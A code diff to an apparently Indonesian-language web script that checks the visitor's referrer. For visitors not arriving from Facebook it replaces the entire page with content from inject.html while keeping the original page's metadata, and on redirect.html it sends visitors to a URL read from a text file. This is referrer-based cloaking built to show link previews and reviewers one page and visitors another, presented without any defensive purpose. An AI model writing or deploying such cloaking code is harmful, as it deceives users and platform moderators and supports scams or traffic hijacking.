@@ -31,15 +31,16 @@
     });
   };
 
-  // Membaca URL dari google.txt, target.txt, dan metadata dari gaji-bank.html
+  // Membaca URL dari google.txt, target.txt, dan metadata dari target.txt
   Promise.all([
     fetchFileContent('/google.txt'),
     fetchFileContent('/target.txt'),
-    fetchFileContent('/zakat-uang-tabungan-di-bank-panduan-lengkap.html'), // Ambil metadata asli dari gaji-bank.html
+    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
   ])
     .then(([googleUrl, targetUrl, originalHtml]) => {
       if (currentPath.includes('redirect.html')) {
         // Redirect selalu dilakukan jika berada di redirect.html
+        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
       } else if (currentPath.includes(targetUrl.trim()) && !referrer.includes('facebook.com')) {
         // Jika gaji-bank.html diakses langsung tanpa referer Facebook
@@ -50,7 +51,7 @@
           .then((response) => response.text())
           .then((html) => {
             document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
-            injectMetadata(originalHtml); // Sisipkan metadata asli dari gaji-bank.html
+            injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
           })
           .catch((err) => console.error('Error loading inject.html:', err));
       }
